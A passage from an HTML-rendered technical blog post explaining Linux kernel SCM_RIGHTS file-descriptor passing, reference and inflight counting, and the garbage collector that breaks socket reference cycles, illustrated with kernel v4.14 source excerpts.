 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c10">?</span><span class="ykcrMYlEiJ-c0">&nbsp;O_CLOEXEC </span><span class="ykcrMYlEiJ-c10">:</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c35">0</span><span class="ykcrMYlEiJ-c10">);</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c14">if</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c0">err </span><span class="ykcrMYlEiJ-c10">&lt;</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c35">0</span><span class="ykcrMYlEiJ-c10">)</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c14">break</span><span class="ykcrMYlEiJ-c10">;</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; new_fd </span><span class="ykcrMYlEiJ-c10">=</span><span class="ykcrMYlEiJ-c0">&nbsp;err</span><span class="ykcrMYlEiJ-c10">;</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; err </span><span class="ykcrMYlEiJ-c10">=</span><span class="ykcrMYlEiJ-c0">&nbsp;put_user</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c0">new_fd</span><span class="ykcrMYlEiJ-c10">,</span><span class="ykcrMYlEiJ-c0">&nbsp;cmfptr</span><span class="ykcrMYlEiJ-c10">);</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c14">if</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c0">err</span><span class="ykcrMYlEiJ-c10">)</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c10">{</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; put_unused_fd</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c0">new_fd</span><span class="ykcrMYlEiJ-c10">);</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c14">break</span><span class="ykcrMYlEiJ-c10">;</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c10">}</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c23">/* Bump the usage count and install the file. */</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; sock </span><span class="ykcrMYlEiJ-c10">=</span><span class="ykcrMYlEiJ-c0">&nbsp;sock_from_file</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c0">fp</span><span class="ykcrMYlEiJ-c10">[</span><span class="ykcrMYlEiJ-c0">i</span><span class="ykcrMYlEiJ-c10">],</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c10">&amp;</span><span class="ykcrMYlEiJ-c0">err</span><span class="ykcrMYlEiJ-c10">);</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c14">if</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c0">sock</span><span class="ykcrMYlEiJ-c10">)</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c10">{</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sock_update_netprioidx</span><span class="ykcrMYlEiJ-c10">(&amp;</span><span class="ykcrMYlEiJ-c0">sock</span><span class="ykcrMYlEiJ-c10">-&gt;</span><span class="ykcrMYlEiJ-c0">sk</span><span class="ykcrMYlEiJ-c10">-&gt;</span><span class="ykcrMYlEiJ-c0">sk_cgrp_data</span><span class="ykcrMYlEiJ-c10">);</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sock_update_classid</span><span class="ykcrMYlEiJ-c10">(&amp;</span><span class="ykcrMYlEiJ-c0">sock</span><span class="ykcrMYlEiJ-c10">-&gt;</span><span class="ykcrMYlEiJ-c0">sk</span><span class="ykcrMYlEiJ-c10">-&gt;</span><span class="ykcrMYlEiJ-c0">sk_cgrp_data</span><span class="ykcrMYlEiJ-c10">);</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c10">}</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">&nbsp; &nbsp; &nbsp; &nbsp; fd_install</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">(</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">new_fd</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">,</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">&nbsp;get_file</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">(</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">fp</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">[</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">i</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">]));</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c10">}</span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c29"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c13"></span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c10">&hellip;</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c23">/*</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c23">&nbsp;* All of the files that fit in the message have had their</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c23">&nbsp;* usage counts incremented, so we just free the list.</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c23">&nbsp;*/</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">__scm_destroy</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">(</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">scm</span><span class="c10 c13 c7">);</span></p></td></tr></table>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span>Once the file descriptors have been installed</span><span>, </span><span class="ykcrMYlEiJ-c3">__scm_destroy</span><span>&nbsp;(</span><span class="ykcrMYlEiJ-c9"><a class="ykcrMYlEiJ-c261" href="https://elixir.bootlin.com/linux/v4.14.277/source/net/core/scm.c#L119">link</a></span><span>) cleans up the allocated </span><span class="ykcrMYlEiJ-c3">scm-&gt;fp</span><span class="ykcrMYlEiJ-c2">&nbsp;and decrements the file reference count for every transmitted file structure:</span></p><a id="t.f6edb942990216f6cb0c4a0bd7dc5c0cd5bf15f9"></a><a id="t.6"></a><table class="ykcrMYlEiJ-c33"><tr class="ykcrMYlEiJ-c17"><td class="ykcrMYlEiJ-c18" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c14">void</span><span class="ykcrMYlEiJ-c0">&nbsp;__scm_destroy</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c14">struct</span><span class="ykcrMYlEiJ-c0">&nbsp;scm_cookie </span><span class="ykcrMYlEiJ-c10">*</span><span class="ykcrMYlEiJ-c0">scm</span><span class="ykcrMYlEiJ-c10">)</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c10">{</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c14">struct</span><span class="ykcrMYlEiJ-c0">&nbsp;scm_fp_list </span><span class="ykcrMYlEiJ-c10">*</span><span class="ykcrMYlEiJ-c0">fpl </span><span class="ykcrMYlEiJ-c10">=</span><span class="ykcrMYlEiJ-c0">&nbsp;scm</span><span class="ykcrMYlEiJ-c10">-&gt;</span><span class="ykcrMYlEiJ-c0">fp</span><span class="ykcrMYlEiJ-c10">;</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c14">int</span><span class="ykcrMYlEiJ-c0">&nbsp;i</span><span class="ykcrMYlEiJ-c10">;</span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c29"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c13"></span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c14">if</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c0">fpl</span><span class="ykcrMYlEiJ-c10">)</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c10">{</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; scm</span><span class="ykcrMYlEiJ-c10">-&gt;</span><span class="ykcrMYlEiJ-c0">fp </span><span class="ykcrMYlEiJ-c10">=</span><span class="ykcrMYlEiJ-c0">&nbsp;NULL</span><span class="ykcrMYlEiJ-c10">;</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c14">for</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c0">i</span><span class="ykcrMYlEiJ-c10">=</span><span class="ykcrMYlEiJ-c0">fpl</span><span class="ykcrMYlEiJ-c10">-&gt;</span><span class="ykcrMYlEiJ-c0">count</span><span class="ykcrMYlEiJ-c10">-</span><span class="ykcrMYlEiJ-c35">1</span><span class="ykcrMYlEiJ-c10">;</span><span class="ykcrMYlEiJ-c0">&nbsp;i</span><span class="ykcrMYlEiJ-c10">&gt;=</span><span class="ykcrMYlEiJ-c35">0</span><span class="ykcrMYlEiJ-c10">;</span><span class="ykcrMYlEiJ-c0">&nbsp;i</span><span class="ykcrMYlEiJ-c10">--)</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">fput</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">(</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">fpl</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">-&gt;</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">fp</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">[</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">i</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">]);</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; free_uid</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c0">fpl</span><span class="ykcrMYlEiJ-c10">-&gt;</span><span class="ykcrMYlEiJ-c0">user</span><span class="ykcrMYlEiJ-c10">);</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; kfree</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c0">fpl</span><span class="ykcrMYlEiJ-c10">);</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c10">}</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c10">}</span></p></td></tr></table><h2 class="ykcrMYlEiJ-c30 ykcrMYlEiJ-c20" id="h.zi0w3dhxm2me"><span class="ykcrMYlEiJ-c1">Reference Counting and Inflight Counting</span></h2>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span>As mentioned above, when a file descriptor is passed using </span><span class="ykcrMYlEiJ-c3">SCM_RIGHTS,</span><span class="ykcrMYlEiJ-c2">&nbsp;its reference count is immediately incremented. Once the recipient socket has accepted and installed the passed file descriptor, the reference count is then decremented. The complication comes from the &ldquo;middle&rdquo; of this operation: after the file descriptor has been sent, but before the receiver has accepted and installed the file descriptor.</span></p>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span class="ykcrMYlEiJ-c2">Let&rsquo;s consider the following scenario:</span></p><ol class="c27 lst-kix_3a2g7o19wgb3-0 start" start="1"><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span>The process creates sockets </span><span class="ykcrMYlEiJ-c8">A</span><span>&nbsp;and </span><span class="ykcrMYlEiJ-c8">B</span><span class="ykcrMYlEiJ-c2">.</span></li><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span class="ykcrMYlEiJ-c8">A</span><span>&nbsp;sends socket </span><span class="ykcrMYlEiJ-c8">A </span><span>to socket </span><span class="ykcrMYlEiJ-c8">B</span><span class="ykcrMYlEiJ-c2">.</span></li><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span class="ykcrMYlEiJ-c8">B</span><span>&nbsp;sends socket </span><span class="ykcrMYlEiJ-c8">B</span><span>&nbsp;to socket </span><span class="ykcrMYlEiJ-c8">A</span><span class="ykcrMYlEiJ-c2">.</span></li><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span>Close </span><span class="ykcrMYlEiJ-c8">A</span><span class="ykcrMYlEiJ-c2">.</span></li><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span>Close </span><span class="ykcrMYlEiJ-c8">B</span><span class="ykcrMYlEiJ-c2">.</span></li></ol>
 <p class="c31 c20 c48"></p>
 <p class="c31 c20 c48"><span class="ykcrMYlEiJ-c2"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEixn2j2I0_3XKxc7uimc_-Bd2F7fUflziTRwXRLeCfzDzrA_GKDsDLvqidYluwq_lGptlzWkZ3DD4f2DGnyjuALHuH46yzHjovkrVdzuG-Ncgi4WphgXf9HK_RPnxB91R07fG7cnyy4wZN-M3qZtb6uKOwarRmxIPdQWbJVA-KQlhKQBBR4EZS6aZDe/s724/image66.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEixn2j2I0_3XKxc7uimc_-Bd2F7fUflziTRwXRLeCfzDzrA_GKDsDLvqidYluwq_lGptlzWkZ3DD4f2DGnyjuALHuH46yzHjovkrVdzuG-Ncgi4WphgXf9HK_RPnxB91R07fG7cnyy4wZN-M3qZtb6uKOwarRmxIPdQWbJVA-KQlhKQBBR4EZS6aZDe/s724/image66.png" border="0" alt="Socket A and B form a reference count cycle." style="max-height: 750px; max-width: 600px;"title="Socket A and B form a reference count cycle." /></a></span></p>
 <p class="ykcrMYlEiJ-c20 ykcrMYlEiJ-c31"><span class="c34 c19 c32">Scenario for reference count cycle</span></p>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span>Both sockets are closed prior to accepting the passed file descriptors.The reference counts of </span><span class="ykcrMYlEiJ-c8">A</span><span>&nbsp;and </span><span class="ykcrMYlEiJ-c8">B</span><span>&nbsp;are both 1 and can&#39;t be further decremented because they were removed from the kernel fd table when the respective processes closed them. Therefore the kernel is unable to release the two skbs and sock structures </span><span>and an unbreakable cycle is formed</span><span>. The Linux kernel garbage collection system is designed to prevent memory exhaustion in this particular scenario. The </span><span class="ykcrMYlEiJ-c3">inflight</span><span>&nbsp;count was implemented to identify potential garbage. Each time the reference count is increased due to an SCM_RIGHTS datagram being sent, the </span><span class="ykcrMYlEiJ-c3">inflight</span><span class="ykcrMYlEiJ-c2">&nbsp;count will also be incremented.</span></p>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span>When a file descriptor is sent by </span><span class="ykcrMYlEiJ-c3">SCM_RIGHTS</span><span>&nbsp;datagram,</span><span>&nbsp;the Linux kernel puts its </span><span class="ykcrMYlEiJ-c3">unix_sock</span><span>&nbsp;into a global list </span><span class="ykcrMYlEiJ-c3">gc_inflight_list</span><span>. The kernel</span><span>&nbsp;</span><span>increments </span><span class="ykcrMYlEiJ-c3">unix_tot_inflight</span><span>&nbsp;which counts the total number of inflight sockets. Then, the kernel increments </span><span class="ykcrMYlEiJ-c3">u-&gt;inflight</span><span>&nbsp;which tracks the inflight count for each individual file descriptor in the </span><span class="ykcrMYlEiJ-c3">unix_inflight</span><span>&nbsp;function (</span><span class="ykcrMYlEiJ-c9"><a class="ykcrMYlEiJ-c261" href="https://elixir.bootlin.com/linux/v4.14.277/source/net/unix/scm.c#L45">scm.c#L45</a></span><span>) invoked from </span><span class="ykcrMYlEiJ-c3">unix_attach_fds</span><span>:</span></p>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p><a id="t.029ba7ef27b97405e8e6fdfbd115b01f42a3bdd9"></a><a id="t.7"></a><table class="ykcrMYlEiJ-c33"><tr class="ykcrMYlEiJ-c17"><td class="ykcrMYlEiJ-c18" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c14">void</span><span class="ykcrMYlEiJ-c0">&nbsp;unix_inflight</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c14">struct</span><span class="ykcrMYlEiJ-c0">&nbsp;user_struct </span><span class="ykcrMYlEiJ-c10">*</span><span class="ykcrMYlEiJ-c0">user</span><span class="ykcrMYlEiJ-c10">,</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c14">struct</span><span class="ykcrMYlEiJ-c0">&nbsp;file </span><span class="ykcrMYlEiJ-c10">*</span><span class="ykcrMYlEiJ-c0">fp</span><span class="ykcrMYlEiJ-c10">)</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c10">{</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c14">struct</span><span class="ykcrMYlEiJ-c0">&nbsp;sock </span><span class="ykcrMYlEiJ-c10">*</span><span class="ykcrMYlEiJ-c0">s </span><span class="ykcrMYlEiJ-c10">=</span><span class="ykcrMYlEiJ-c0">&nbsp;unix_get_socket</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c0">fp</span><span class="ykcrMYlEiJ-c10">);</span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c29"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c13"></span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; spin_lock</span><span class="ykcrMYlEiJ-c10">(&amp;</span><span class="ykcrMYlEiJ-c0">unix_gc_lock</span><span class="ykcrMYlEiJ-c10">);</span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c29"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c13"></span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c14">if</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c0">s</span><span class="ykcrMYlEiJ-c10">)</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c10">{</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c14">struct</span><span class="ykcrMYlEiJ-c0">&nbsp;unix_sock </span><span class="ykcrMYlEiJ-c10">*</span><span class="ykcrMYlEiJ-c0">u </span><span class="ykcrMYlEiJ-c10">=</span><span class="ykcrMYlEiJ-c0">&nbsp;unix_sk</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c0">s</span><span class="ykcrMYlEiJ-c10">);</span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c29"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c13"></span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c14 ykcrMYlEiJ-c7">if</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">&nbsp;</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">(</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">atomic_long_inc_return</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">(&amp;</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">u</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">-&gt;</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">inflight</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">)</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">&nbsp;</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">==</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">&nbsp;</span><span class="ykcrMYlEiJ-c35 ykcrMYlEiJ-c7">1</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">)</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">&nbsp;</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">{</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; BUG_ON</span><span class="ykcrMYlEiJ-c10">(!</span><span class="ykcrMYlEiJ-c0">list_empty</span><span class="ykcrMYlEiJ-c10">(&amp;</span><span class="ykcrMYlEiJ-c0">u</span><span class="ykcrMYlEiJ-c10">-&gt;</span><span class="ykcrMYlEiJ-c0">link</span><span class="ykcrMYlEiJ-c10">));</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; list_add_tail</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">(&amp;</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">u</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">-&gt;</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">link</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">,</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">&nbsp;</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">&amp;</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">gc_inflight_list</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">);</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c10">}</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c14">else</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c10">{</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; BUG_ON</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c0">list_empty</span><span class="ykcrMYlEiJ-c10">(&amp;</span><span class="ykcrMYlEiJ-c0">u</span><span class="ykcrMYlEiJ-c10">-&gt;</span><span class="ykcrMYlEiJ-c0">link</span><span class="ykcrMYlEiJ-c10">));</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c10">}</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; unix_tot_inflight</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">++;</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c10">}</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">&nbsp; &nbsp; &nbsp; &nbsp; user</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">-&gt;</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">unix_inflight</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">++;</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; spin_unlock</span><span class="ykcrMYlEiJ-c10">(&amp;</span><span class="ykcrMYlEiJ-c0">unix_gc_lock</span><span class="ykcrMYlEiJ-c10">);</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c10">}</span></p></td></tr></table>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span>Thus, here is what the </span><span class="ykcrMYlEiJ-c3">sk_buff</span><span>&nbsp;looks like when transferring a file descriptor within sockets </span><span class="ykcrMYlEiJ-c8">A</span><span>&nbsp;and </span><span class="ykcrMYlEiJ-c8">B</span><span class="ykcrMYlEiJ-c2">:</span></p>
 <p class="ykcrMYlEiJ-c31 ykcrMYlEiJ-c20"></p>
